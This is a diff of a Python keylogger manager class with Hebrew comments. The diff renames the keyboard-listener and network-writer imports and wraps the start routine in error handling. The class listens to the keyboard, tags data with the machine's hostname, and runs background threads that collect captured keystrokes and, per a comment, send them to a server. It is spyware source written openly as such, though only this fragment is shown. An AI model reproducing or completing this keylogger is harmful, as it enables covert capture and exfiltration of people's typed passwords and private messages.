@@ -1,33 +1,35 @@
-from keylogger_listener import ListenerKeyboard
+from keylogger_service import Service
 from encrypt import Encryption
 from file_writer import FileWriter
 import time
 from datetime import datetime
 import threading
-from create_encryption_key import CreateKey
 import socket
-from network_writer import NetworkSaver
+from network_writer import NetworkWriter
 
 class KeyloggerManager:
 
     def __init__(self,key):         #בעת יצירת מופע יש להכניס מפתח הצפנה
-        self.keylogger_listener = ListenerKeyboard()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
+        self.keylogger_listener = Service()       # נוצרים אוטומטית מופעים של ListenerKeyboard() וFileWriter()/ NetworkWriter()
         self.buffer = {}
         self.key = key
-        self.writer = NetworkSaver()
+        self.writer = NetworkWriter()
         self.machine_name = socket.gethostname()
         self.copied = False
         self.running = False
 
 
     def start(self):          # פונקציה להפעלת כל תכונות הKeyloggerManager
-        self.running = True
-        # מתחיל האזנה למקלדת
-        self.keylogger_listener.start_logging()
-        # יצירת תהליכון האחראי לריצת הפונקציה get_update() הרץ במקביל לתהליכון  send_data()
-        threading.Thread(target=self.get_update,daemon=True).start()
-        # מתחיל תהליכון לשליחת הנתונים לשרת
-        threading.Thread(target=self.send_data, daemon=True).start()
+        try:
+            self.running = True
+            # מתחיל האזנה למקלדת
+            self.keylogger_listener.start_logging()
+            # יצירת תהליכון האחראי לריצת הפונקציה get_update() הרץ במקביל לתהליכון  send_data()
+            threading.Thread(target=self.get_update,daemon=True).start()
+            # מתחיל תהליכון לשליחת הנתונים לשרת
+            threading.Thread(target=self.send_data, daemon=True).start()
+        except:
+            print("starting error")
 
 
 
